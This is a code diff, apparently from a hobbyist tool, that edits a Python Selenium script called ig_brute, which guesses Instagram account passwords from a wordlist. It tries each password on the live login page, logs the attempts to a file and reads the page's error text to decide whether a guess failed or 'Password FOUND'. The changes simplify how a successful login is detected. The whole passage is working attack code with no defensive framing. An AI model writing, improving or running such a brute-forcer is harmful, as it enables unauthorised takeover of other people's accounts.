@@ -67,11 +67,11 @@ def ig_brute(username,password_wordlist):
             with open("Passwords/entered_passwords.txt","a+") as fi:
                 fi.write("\n"+password_wordlist[x])
         except:
-            continue
+            pass
         try:
             captcha=WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[7]/p'))).text
             if "your password was incorrect." in captcha:
-                print(colored.red("[-]Password Is Not:")+colored.magenta(password_wordlist[x-1]))
+                print(colored.red("[-]Password Is Not:")+colored.magenta(password_wordlist[x]))
             elif "a problem" in captcha or "couldn't connect to Instagram" in captcha:
                 if x>0:
                     x=x-1
@@ -97,29 +97,10 @@ def ig_brute(username,password_wordlist):
             else:
                 print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x]))
         except:
-            try:
-                WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[3]/section/nav/div[2]/div/div/div[2]/div/div"))).click()
-                print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x]))
-                break
-                exit()
-            except:
-                try:
-                    #/html/body/div[1]/section/main/div/article/div/div[3]/div/a[1]
-                    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/section/main/div/article/div/div[3]/div/a[1]"))).click()
-                    print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x]))
-                    break
-                    exit()
-                except:
-                    #/html/body/div[1]/section/nav/div[2]/div/div/div[1]/a/div/div/img
-                    try:
-                        WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/section/nav/div[2]/div/div/div[1]/a/div/div/img"))).click()
-                        print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x]))
-                        break
-                        exit()
-                    except:
-                        print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x]))
-                        break
-                        exit()
+            print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x]))
+            break
+            exit()
+                
         x+=1
         
     for j in password_wordlist:
